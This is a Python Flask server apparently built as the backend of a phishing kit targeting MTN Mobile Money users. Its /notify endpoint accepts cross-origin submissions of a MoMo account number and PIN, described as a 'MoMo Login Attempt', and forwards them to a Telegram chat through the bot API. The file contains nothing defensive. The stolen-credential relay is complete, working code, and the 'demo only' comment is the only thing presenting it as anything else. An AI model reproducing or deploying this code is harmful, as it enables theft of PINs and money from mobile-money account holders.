from flask import Flask, request, jsonify
import os
import requests

app = Flask(__name__)

BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")


# Allow browser requests from any origin (demo only)
@app.after_request
def add_cors_headers(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Methods"] = "POST, GET, OPTIONS"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    return response


@app.route("/", methods=["GET"])
def home():
    return jsonify({"status": "ok", "service": "mtn-bot"})


@app.route("/healthz", methods=["GET"])
def healthz():
    return "ok", 200


@app.route("/notify", methods=["POST", "OPTIONS"])
def notify():
    if request.method == "OPTIONS":
        return "", 204

    data = request.get_json(silent=True) or {}
    momo = data.get("momo", "unknown")
    pin = data.get("pin", "unknown")
    time = data.get("time", "unknown")

    text = (
        "🔐 *MoMo Login Attempt*\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"📱 *MoMo:* {momo}\n"
        f"🔑 *PIN:* {pin}\n"
        f"🕒 *Time:* {time}"
    )

    if not BOT_TOKEN or not CHAT_ID:
        return jsonify({"ok": False, "error": "Server not configured"}), 500

    try:
        res = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"},
            timeout=10,
        )
        return jsonify(res.json())
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
